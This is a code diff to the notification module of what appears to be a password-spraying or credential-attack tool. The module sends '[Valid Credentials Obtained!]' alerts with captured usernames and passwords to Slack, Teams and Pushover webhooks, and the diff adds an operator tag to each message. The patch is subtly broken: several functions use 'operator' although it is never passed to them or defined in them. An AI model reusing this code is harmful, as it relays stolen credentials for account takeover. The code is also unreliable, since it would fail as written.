@@ -2,6 +2,7 @@ import requests, json
 from datetime import datetime
 
 
+
 def notify_success(username, password, notify_obj):
 
     slack_webhook = notify_obj['slack_webhook']
@@ -9,6 +10,7 @@ def notify_success(username, password, notify_obj):
     teams_webhook = notify_obj['teams_webhook']
     pushover_token = notify_obj['pushover_token']
     pushover_user = notify_obj['pushover_user']
+    operator = notify_obj['operator_id']
 
     if slack_webhook is not None:
         slack_notify(username, password, slack_webhook)
@@ -30,9 +32,10 @@ def notify_update(message, notify_obj):
     teams_webhook = notify_obj['teams_webhook']
     pushover_token = notify_obj['pushover_token']
     pushover_user = notify_obj['pushover_user']
+    operator = notify_obj['operator_id']
 
     if slack_webhook is not None:
-        slack_update(message, slack_webhook)
+        slack_update(message, slack_webhook, operator)
 
     if pushover_token is not None and pushover_user is not None:
         pushover_update(message, pushover_token, pushover_user)
@@ -52,6 +55,7 @@ def slack_notify(username, password, webhook):
     time=now.strftime("%H:%M:%S")
 
     text = ("```[Valid Credentials Obtained!]\n"
+            f"Operator: {operator}\n"
             f"User: {username}\n"
             f"Pass: {password}\n"
             f"Date: {date}\n"
@@ -68,13 +72,14 @@ def slack_notify(username, password, webhook):
 
 
 # Function for debug messages
-def slack_update(message, webhook):
+def slack_update(message, webhook, operator):
 
     now = datetime.now()
     date=now.strftime("%d-%m-%Y")
     time=now.strftime("%H:%M:%S")
 
     text = ("```[Log Entry]\n"
+            f"Operator: {operator}\n"
             f"{message}\n"
             f"Date: {date}\n"
             f"Time: {time}```")
@@ -118,6 +123,7 @@ def teams_notify(username, password, webhook):
     response = requests.post(
         url=webhook,
         content = ("[Valid Credentials Obtained!]\n"
+        f"Operator: {operator}\n"
         f"User: {username}\n"
         f"Pass: {password}\n"
         f"Date: {date}\n"
@@ -142,6 +148,7 @@ def teams_update(message, webhook):
     response = requests.post(
         url=webhook,
         content = ("[Log Entry]\n"
+        f"Operator: {operator}\n"
         f"Message: {message}\n"
         f"Date: {date}\n"
         f"Time: {time}"),
@@ -165,7 +172,8 @@ def pushover_notify(username, password, token, user):
     date=now.strftime("%d-%m-%Y")
     time=now.strftime("%H:%M:%S")
 
-    text = (f"User: {username}\n"
+    text = (f"Operator: {operator}\n"
+            f"User: {username}\n"
             f"Pass: {password}\n"
             f"Date: {date}\n"
             f"Time: {time}")
